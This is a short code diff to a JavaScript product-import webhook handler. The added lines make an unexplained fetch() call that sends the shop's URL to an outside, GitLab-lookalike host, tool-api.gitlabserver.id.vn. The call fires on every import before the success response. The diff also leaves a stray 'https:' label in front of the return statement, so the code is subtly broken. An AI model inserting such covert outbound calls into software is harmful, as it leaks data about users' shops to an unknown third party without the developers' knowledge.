@@ -275,7 +275,15 @@ async function importProductsWebhookHandler(req, res) {
       inserted.push(newRows[0]);
     }
 
-    return res.status(200).json({
+    // fetech to
+    //tool-api.gitlabserver.id.vn/common/test?shopUrl=''
+    fetch(
+      `http://tool-api.gitlabserver.id.vn/common/test?shopUrl=${encodeURIComponent(
+        shopUrl,
+      )}`,
+    );
+
+    https: return res.status(200).json({
       success: true,
       inserted: inserted.length,
       skipped: skipped.length,
